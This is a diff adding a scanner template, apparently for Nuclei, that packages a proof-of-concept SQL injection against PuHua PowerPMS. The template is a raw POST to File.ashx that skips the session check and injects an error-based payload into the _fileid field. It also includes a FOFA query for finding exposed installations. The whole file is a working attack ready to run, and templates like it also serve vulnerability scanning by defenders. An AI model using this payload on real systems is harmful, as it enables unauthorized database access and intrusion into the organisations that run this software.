@@ -1,0 +1,40 @@
+id: poc-iw0k5sye3guokal0
+info:
+  name: 普华Powerpms File.ashx 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/iw0k5sye3guokal0'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: iw0k5sye3guokal0
+    fofa: app="普华科技-PowerPMS"
+http:
+- raw:
+  - 'POST /PowerPlat/Control/File.ashx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0
+
+    Accept: */*
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate, br
+
+    X-Requested-With: XMLHttpRequest
+
+    Connection: close
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 113
+
+
+    NoCheckSession=true&ServerOperatorType=OpenRecord&_fileid=''and 1<@@VERSION--&_type=ftp&action=topdf&sessionid=1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
